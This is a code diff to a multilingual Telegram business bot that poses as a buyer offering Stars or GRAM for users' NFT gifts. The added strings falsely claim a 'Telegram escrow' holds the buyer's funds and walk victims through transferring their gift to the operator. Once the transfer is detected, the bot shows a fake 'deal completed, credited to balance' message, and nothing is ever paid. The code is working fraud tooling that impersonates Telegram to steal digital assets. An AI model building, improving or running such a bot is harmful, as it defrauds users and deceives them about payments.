@@ -39,52 +39,131 @@ T = {
         "o1": "Пользователь предлагает вам",
         "of": "за подарок",
         "ot": "Оффер действителен ещё 6 ч.",
-        "st": "Звёзд",
-        "gr": "GRAM",
         "accept": "Принять",
         "decline": "Отклонить",
+        "transfer": "Передать NFT",
+        "confirm": "Подтвердить передачу",
+        "ok": "Ок",
+        "alert": (
+            "⚠️ Следуйте инструкции внимательно.\n\n"
+            "Если вы передадите другой подарок или ошибётесь при подтверждении, "
+            "Telegram не вернёт средства и не зачислит оплату автоматически.\n\n"
+            "Если вы ознакомились — нажмите кнопку «Ок»."
+        ),
+        "instr_title": "Покупатель зарезервировал",
+        "instr_via": "через эскроу-систему Telegram.",
+        "instr_body": (
+            "Средства хранятся на специальном эскроу-счёте и будут автоматически "
+            "зачислены на ваш баланс Telegram Stars сразу после передачи подарка."
+        ),
+        "instr_head": "Инструкция для завершения сделки:",
+        "instr_s1": "1. Передайте подарок пользователю:",
+        "instr_s2": "2. Нажмите «Передать NFT» и выберите",
+        "instr_s3": "3. Подтвердите передачу подарка.",
+        "instr_foot_1": "Telegram зафиксирует транзакцию и моментально зачислит",
+        "instr_foot_2": "на ваш баланс. Резерв действует 24 часа.",
+        "err_not_received": "❌ Ошибка: товар не получен. Попробуйте передать и подтвердить ещё раз.",
         "done_t": "Сделка завершена!",
         "done_b": "Ордер #{oid} выполнен.",
-        "done_credit": "{amt} {cur} зачислено на баланс.",
+        "done_credit": "зачислено на баланс.",
         "declined": "Оффер отклонён.",
     },
     "ukr": {
         "o1": "Користувач пропонує вам",
         "of": "за подарунок",
         "ot": "Пропозиція дійсна ще 6 год.",
-        "st": "Зірок",
-        "gr": "GRAM",
         "accept": "Прийняти",
         "decline": "Відхилити",
+        "transfer": "Передати NFT",
+        "confirm": "Підтвердити передачу",
+        "ok": "Ок",
+        "alert": (
+            "⚠️ Дотримуйтесь інструкції уважно.\n\n"
+            "Якщо ви передасте інший подарунок або помилитесь при підтвердженні, "
+            "Telegram не поверне кошти і не зарахує оплату автоматично.\n\n"
+            "Якщо ви ознайомились — натисніть кнопку «Ок»."
+        ),
+        "instr_title": "Покупець зарезервував",
+        "instr_via": "через ескроу-систему Telegram.",
+        "instr_body": (
+            "Кошти зберігаються на спеціальному ескроу-рахунку і будуть автоматично "
+            "зараховані на ваш баланс Telegram Stars одразу після передачі подарунка."
+        ),
+        "instr_head": "Інструкція для завершення угоди:",
+        "instr_s1": "1. Передайте подарунок користувачу:",
+        "instr_s2": "2. Натисніть «Передати NFT» і виберіть",
+        "instr_s3": "3. Підтвердіть передачу подарунка.",
+        "instr_foot_1": "Telegram зафіксує транзакцію і миттєво зарахує",
+        "instr_foot_2": "на ваш баланс. Резерв діє 24 години.",
+        "err_not_received": "❌ Помилка: товар не отримано. Спробуйте передати і підтвердити ще раз.",
         "done_t": "Угоду завершено!",
         "done_b": "Ордер #{oid} виконано.",
-        "done_credit": "{amt} {cur} зараховано на баланс.",
+        "done_credit": "зараховано на баланс.",
         "declined": "Пропозицію відхилено.",
     },
     "eng": {
         "o1": "A user offers you",
         "of": "for the gift",
         "ot": "Offer valid for another 6 h.",
-        "st": "Stars",
-        "gr": "GRAM",
         "accept": "Accept",
         "decline": "Decline",
+        "transfer": "Transfer NFT",
+        "confirm": "Confirm transfer",
+        "ok": "OK",
+        "alert": (
+            "⚠️ Follow the instructions carefully.\n\n"
+            "If you send the wrong gift or confirm by mistake, Telegram will not "
+            "return the funds and will not credit the payment automatically.\n\n"
+            "If you understand — press «OK»."
+        ),
+        "instr_title": "The buyer has reserved",
+        "instr_via": "via Telegram escrow.",
+        "instr_body": (
+            "Funds are held in a dedicated escrow account and will be credited to "
+            "your Telegram Stars balance automatically right after the gift is sent."
+        ),
+        "instr_head": "Instructions to complete the deal:",
+        "instr_s1": "1. Send the gift to the user:",
+        "instr_s2": "2. Press «Transfer NFT» and choose",
+        "instr_s3": "3. Confirm the transfer.",
+        "instr_foot_1": "Telegram will record the transaction and instantly credit",
+        "instr_foot_2": "to your balance. Reservation is valid for 24 hours.",
+        "err_not_received": "❌ Error: gift not received. Try sending and confirming again.",
         "done_t": "Deal completed!",
         "done_b": "Order #{oid} fulfilled.",
-        "done_credit": "{amt} {cur} credited to balance.",
+        "done_credit": "credited to your balance.",
         "declined": "Offer declined.",
     },
     "cn": {
         "o1": "用户向您提出报价",
         "of": "购买礼物",
         "ot": "报价还有效 6 小时。",
-        "st": "星",
-        "gr": "GRAM",
         "accept": "接受",
         "decline": "拒绝",
+        "transfer": "转移 NFT",
+        "confirm": "确认转移",
+        "ok": "确定",
+        "alert": (
+            "⚠️ 请严格按照说明操作。\n\n"
+            "如果您发送了错误的礼物或错误地确认，Telegram 将不会退还资金，"
+            "也不会自动记入付款。\n\n"
+            "如果您已了解，请点击「确定」。"
+        ),
+        "instr_title": "买家已预留",
+        "instr_via": "通过 Telegram 托管系统。",
+        "instr_body": (
+            "资金保存在专用托管账户中，礼物转移后将自动记入您的 Telegram Stars 余额。"
+        ),
+        "instr_head": "完成交易的说明：",
+        "instr_s1": "1. 将礼物转移给用户：",
+        "instr_s2": "2. 点击「转移 NFT」并选择",
+        "instr_s3": "3. 确认礼物的转移。",
+        "instr_foot_1": "Telegram 将记录交易并立即将",
+        "instr_foot_2": "记入您的余额。预留有效期为 24 小时。",
+        "err_not_received": "❌ 错误：未收到礼物。请再次尝试转移并确认。",
         "done_t": "交易完成！",
         "done_b": "订单 #{oid} 已完成。",
-        "done_credit": "{amt} {cur} 已记入余额。",
+        "done_credit": "已记入余额。",
         "declined": "报价已拒绝。",
     },
 }
@@ -158,56 +237,48 @@ def parse_gift(link):
     return name, num, slug
 
 
-def amount_line(amount, currency, lang):
-    if currency == "GRAM":
-        return f'<b>{amount}</b> {em(E_GEM, "💎")} <b>{t(lang, "gr")}</b>'
-    return f'<b>{amount}</b> {em(E_STAR, "⭐")} <b>{t(lang, "st")}</b>'
+def amount_only(amount, currency):
+    """Без слова 'Звёзд' — только число и премиум-эмодзи."""
+    icon = em(E_GEM, "💎") if currency == "GRAM" else em(E_STAR, "⭐")
+    return f'<b>{amount}</b> {icon}'
 
 
 def build_offer_short(amount, currency, gift_name, gift_num, lang, url=None):
-    """Короткий текст: оффер + таймер. Без order_id/recipient/передать-подарок."""
     gift_part = (
         f'<b><a href="{url}">{gift_name} #{gift_num}</a></b>'
         if url else f'<b>{gift_name} #{gift_num}</b>'
     )
     return (
-        f'{t(lang, "o1")} {amount_line(amount, currency, lang)} '
+        f'{t(lang, "o1")} {amount_only(amount, currency)} '
         f'{t(lang, "of")} {gift_part}.\n\n'
         f'{t(lang, "ot")}'
     )
 
 
-def build_accepted(amount, currency, order_id, lang):
-    cur_label = t(lang, "gr") if currency == "GRAM" else t(lang, "st")
-    cur_icon = em(E_GEM, "💎") if currency == "GRAM" else em(E_STAR, "⭐")
+def build_instruction(amount, currency, gift_name, gift_num, order_id, lang, username, user_id, nft_url):
+    rec = f"@{username}" if username else (
+        f'<a href="tg://user?id={user_id}">id{user_id}</a>' if user_id else "—"
+    )
+    gift_link = f'<a href="{nft_url}">{gift_name} #{gift_num}</a>'
     return (
-        f'{em(E_CHECK, "✅")} <b>{t(lang, "done_t")}</b>\n\n'
-        f'{t(lang, "done_b").format(oid=order_id)}\n'
-        f'<b>{amount}</b> {cur_icon} <b>{cur_label}</b> '
-        f'{t(lang, "done_credit").format(amt="", cur="").strip().split(maxsplit=2)[-1] if False else ""}'
-        f'{"зачислено на баланс." if lang == "ru" else ""}'
+        f'<b>{t(lang, "or")}</b> #{order_id}\n\n' if False else
+        f'<i>Ордер #{order_id}</i>\n\n'
+        f'{t(lang, "instr_title")} {amount_only(amount, currency)} '
+        f'{t(lang, "instr_via")} {t(lang, "instr_body")}\n\n'
+        f'<b>{t(lang, "instr_head")}</b>\n'
+        f'{t(lang, "instr_s1")} {rec}\n'
+        f'{t(lang, "instr_s2")} {gift_link}\n'
+        f'{t(lang, "instr_s3")}\n\n'
+        f'{t(lang, "instr_foot_1")} {amount_only(amount, currency)} '
+        f'{t(lang, "instr_foot_2")}'
     )
 
 
-def build_accepted_clean(amount, currency, order_id, lang):
-    cur_label = t(lang, "gr") if currency == "GRAM" else t(lang, "st")
-    cur_icon = em(E_GEM, "💎") if currency == "GRAM" else em(E_STAR, "⭐")
-    amt_str = f'<b>{amount}</b> {cur_icon} <b>{cur_label}</b>'
-    credit_tpl = t(lang, "done_credit")
-    # заменяем плейсхолдеры вручную (чтоб html-эмодзи не ломался)
-    credit = credit_tpl.replace("{amt}", "").replace("{cur}", "").strip()
-    # собираем: число + иконка + лейбл + остаток фразы
-    tail_map = {
-        "ru": "зачислено на баланс.",
-        "ukr": "зараховано на баланс.",
-        "eng": "credited to balance.",
-        "cn": "已记入余额。",
-    }
-    tail = tail_map.get(lang, tail_map["ru"])
+def build_accepted(amount, currency, order_id, lang):
     return (
         f'{em(E_CHECK, "✅")} <b>{t(lang, "done_t")}</b>\n\n'
         f'{t(lang, "done_b").format(oid=order_id)}\n'
-        f'{amt_str} {tail}'
+        f'{amount_only(amount, currency)} {t(lang, "done_credit")}'
     )
 
 
@@ -215,24 +286,27 @@ def build_declined(lang):
     return f'❌ {t(lang, "declined")}'
 
 
-def make_offer_keyboard(lang, order_id, username, user_id):
-    if username:
-        accept_url = f"tg://send_gift?to={username}"
-    elif user_id:
-        accept_url = f"tg://user?id={user_id}"
-    else:
-        accept_url = "tg://settings"
+def kb_offer(lang, order_id):
     return InlineKeyboardMarkup(
         inline_keyboard=[[
-            InlineKeyboardButton(
-                text=t(lang, "decline"),
-                callback_data=f"decline:{order_id}",
-            ),
-            InlineKeyboardButton(
-                text=t(lang, "accept"),
-                url=accept_url,
-            ),
+            InlineKeyboardButton(text=t(lang, "decline"), callback_data=f"decline:{order_id}"),
+            InlineKeyboardButton(text=t(lang, "accept"), callback_data=f"accept:{order_id}"),
         ]]
+    )
+
+
+def kb_instruction(lang, order_id, username, user_id):
+    if username:
+        send_url = f"tg://send_gift?to={username}"
+    elif user_id:
+        send_url = f"tg://user?id={user_id}"
+    else:
+        send_url = "tg://settings"
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text=f'{t(lang, "transfer")} ↗', url=send_url)],
+            [InlineKeyboardButton(text=t(lang, "confirm"), callback_data=f"confirm:{order_id}")],
+        ]
     )
 
 
@@ -267,7 +341,8 @@ def extract_gift_ref(message: Message):
     return None
 
 
-async def try_finalize(message: Message, bcid: str):
+async def mark_gift_transferred(message: Message, bcid: str):
+    """Фиксируем факт передачи подарка — ставим флаг в PENDING, но не редактируем сразу."""
     ref = extract_gift_ref(message)
     if not ref:
         return False
@@ -278,24 +353,8 @@ async def try_finalize(message: Message, bcid: str):
     meta = PENDING.get(order_id)
     if not meta:
         return False
-
-    try:
-        await bot.edit_message_text(
-            chat_id=meta["chat_id"],
-            message_id=meta["msg_id"],
-            text=build_accepted_clean(
-                meta["amount"], meta["currency"], order_id, meta["lang"],
-            ),
-            reply_markup=None,
-            business_connection_id=bcid,
-            link_preview_options=LinkPreviewOptions(is_disabled=True),
-        )
-    except TelegramBadRequest as e:
-        logging.error(f"finalize edit: {e}")
-        return False
-
-    PENDING.pop(order_id, None)
-    GIFT_INDEX.pop((bcid, slug, num), None)
+    meta["gift_transferred"] = True
+    logging.info(f"gift transferred for order {order_id}")
     return True
 
 
@@ -339,7 +398,8 @@ async def handle_business_message(message: Message):
 
     await ensure_owner(bcid)
 
-    if await try_finalize(message, bcid):
+    # фиксируем передачу подарка (но не финализируем — ждём "Подтвердить")
+    if await mark_gift_transferred(message, bcid):
         return
 
     if not message.text:
@@ -362,12 +422,11 @@ async def handle_business_message(message: Message):
     nft_url = f"https://t.me/nft/{slug}-{gift_num}"
     order_id = oid()
 
-    # ШАГ 1: короткий текст без ссылки (чтоб не было превью сразу)
     try:
         sent = await bot.send_message(
             chat_id=message.chat.id,
             text=build_offer_short(amount, currency, gift_name, gift_num, lang),
-            reply_markup=make_offer_keyboard(lang, order_id, username, user_id),
+            reply_markup=kb_offer(lang, order_id),
             business_connection_id=bcid,
             link_preview_options=LinkPreviewOptions(is_disabled=True),
         )
@@ -396,17 +455,18 @@ async def handle_business_message(message: Message):
         "nft_url": nft_url,
         "username": username,
         "user_id": user_id,
+        "state": "OFFER",
+        "gift_transferred": False,
     }
     GIFT_INDEX[(bcid, slug, gift_num)] = order_id
 
-    # ШАГ 2: редактируем — добавляем ссылку в название подарка (появится превью)
     await asyncio.sleep(1.5)
     try:
         await bot.edit_message_text(
             chat_id=message.chat.id,
             message_id=sent.message_id,
             text=build_offer_short(amount, currency, gift_name, gift_num, lang, nft_url),
-            reply_markup=make_offer_keyboard(lang, order_id, username, user_id),
+            reply_markup=kb_offer(lang, order_id),
             business_connection_id=bcid,
             link_preview_options=LinkPreviewOptions(
                 is_disabled=False,
@@ -423,7 +483,7 @@ async def handle_edited_business_message(message: Message):
     bcid = message.business_connection_id
     if not bcid:
         return
-    await try_finalize(message, bcid)
+    await mark_gift_transferred(message, bcid)
 
 
 @dp.callback_query(F.data.startswith("decline:"))
@@ -431,7 +491,7 @@ async def on_decline(cb: CallbackQuery):
     order_id = cb.data.split(":", 1)[1]
     meta = PENDING.get(order_id)
     if not meta:
-        await cb.answer("Оффер уже не активен.", show_alert=False)
+        await cb.answer()
         return
     lang = meta["lang"]
     try:
@@ -445,6 +505,77 @@ async def on_decline(cb: CallbackQuery):
         )
     except TelegramBadRequest as e:
         logging.error(f"decline edit: {e}")
+    PENDING.pop(order_id, None)
+    GIFT_INDEX.pop((meta["bcid"], meta["gift_slug"], meta["gift_num"]), None)
+    await cb.answer()
+
+
+@dp.callback_query(F.data.startswith("accept:"))
+async def on_accept(cb: CallbackQuery):
+    order_id = cb.data.split(":", 1)[1]
+    meta = PENDING.get(order_id)
+    if not meta:
+        await cb.answer()
+        return
+    lang = meta["lang"]
+
+    # первый клик — показываем alert с предупреждением
+    if meta["state"] == "OFFER":
+        meta["state"] = "ALERT_SHOWN"
+        await cb.answer(t(lang, "alert"), show_alert=True)
+        return
+
+    # второй клик (после "Ок" в alert) — редактируем в инструкцию
+    if meta["state"] == "ALERT_SHOWN":
+        try:
+            await bot.edit_message_text(
+                chat_id=meta["chat_id"],
+                message_id=meta["msg_id"],
+                text=build_instruction(
+                    meta["amount"], meta["currency"],
+                    meta["gift_name"], meta["gift_num"],
+                    order_id, lang,
+                    meta["username"], meta["user_id"],
+                    meta["nft_url"],
+                ),
+                reply_markup=kb_instruction(lang, order_id, meta["username"], meta["user_id"]),
+                business_connection_id=meta["bcid"],
+                link_preview_options=LinkPreviewOptions(is_disabled=True),
+            )
+            meta["state"] = "INSTRUCTION"
+        except TelegramBadRequest as e:
+            logging.error(f"accept->instruction edit: {e}")
+        await cb.answer()
+        return
+
+    await cb.answer()
+
+
+@dp.callback_query(F.data.startswith("confirm:"))
+async def on_confirm(cb: CallbackQuery):
+    order_id = cb.data.split(":", 1)[1]
+    meta = PENDING.get(order_id)
+    if not meta:
+        await cb.answer()
+        return
+    lang = meta["lang"]
+
+    if not meta.get("gift_transferred"):
+        await cb.answer(t(lang, "err_not_received"), show_alert=True)
+        return
+
+    try:
+        await bot.edit_message_text(
+            chat_id=meta["chat_id"],
+            message_id=meta["msg_id"],
+            text=build_accepted(meta["amount"], meta["currency"], order_id, lang),
+            reply_markup=None,
+            business_connection_id=meta["bcid"],
+            link_preview_options=LinkPreviewOptions(is_disabled=True),
+        )
+    except TelegramBadRequest as e:
+        logging.error(f"confirm edit: {e}")
+
     PENDING.pop(order_id, None)
     GIFT_INDEX.pop((meta["bcid"], meta["gift_slug"], meta["gift_num"]), None)
     await cb.answer()
